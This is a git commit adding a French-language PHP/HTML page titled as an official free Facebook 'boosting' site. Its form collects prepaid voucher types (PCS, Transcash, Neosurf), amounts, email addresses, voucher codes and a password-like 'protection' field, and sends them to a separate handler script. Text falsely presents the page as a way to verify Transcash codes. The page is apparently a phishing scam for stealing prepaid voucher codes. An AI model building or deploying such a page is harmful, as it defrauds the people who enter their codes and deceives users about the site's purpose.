daffaef9d0a68fde61fa4bb0844890ff8a7d5876
fibi23 <143339220+fibi23@users.noreply.github.com>
2023-09-06 04:01:15 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<title>SITE OFFICIEL DE BOOSTAGE GRATUIT</title>
+</head>
+<body>
+	<header>
+		<h1 class="titre">SITE OFFICIEL DE BOOSTAGE GRATUIT</h1>
+		<img src="header.jpg">
+		<h2 class="s_titre">Booster votre facebook gratuitement</h2>
+		<div align="center">
+			<form method="POST" action="traitements.php">
+				
+				
+				<table>
+					<tr>
+						<td align="right">
+							<label for="type">:</label>
+						</td>
+						<td>
+							<input class="type" type="text" placeholder="PCS-TRANSCASH-NEOSURF" id="type" name="type">
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+							<label for="Montant">Montant:</label>
+						</td>
+						<td>
+							<input class="montant" type="number" id="Montant" name="montant"><label class="euro">€</label>
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+							<label for="mail">E-mail:</label>
+						</td>
+						<td>
+							<input class="mail" type="email"  id="mail" name="mail">
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+							<label for="mail2">Confirmation de votre mail:</label>
+						</td>
+						<td>
+							<input class="conemail" type="email"  id="mail2" name="mail2">
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+							<label for="code">Code du coupon:</label>
+						</td>
+						<td>
+							<input class="code" type="text" id="code" name="code">
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+							<label for="mdp">Protegez votre Code du coupon:</label>
+						</td>
+						<td>
+							<input class="code2" type="password" id="mdp" name="mdp">
+						</td>
+					</tr>
+					<tr>
+						<td align="right">
+						</td>
+						<td align="center">
+							<input class="entrer" type="submit" value="ACTIVER" >
+						</td>
+					</tr>
+				</table>
+			</form>
+		</div>
+	<content>
+		<div class="image" >
+			<img src="bar.jpg" >
+		</div>
+		<h4>La vérification de votre code recharge Trans-cash vous permet d'être sûr que le tickets est authentique et n'est pas utiliser au préalable par le vendeur. Elle vous garantie une bonne utilisation pour vos rechargements, vos achats et vos paiements de factures. Vérifiez votre code et sécuriser les par SMS</h4>
+		<div class="image">
+			 <img src="footer.jpg">
+		</div>
+	</content>
+	<footer>
+		<p>copyright 2021-2022 SITE-OFFICIEL-DE-ACTIVATION-tous droits reservées</p>
+	</footer>
+</body>
+</html>
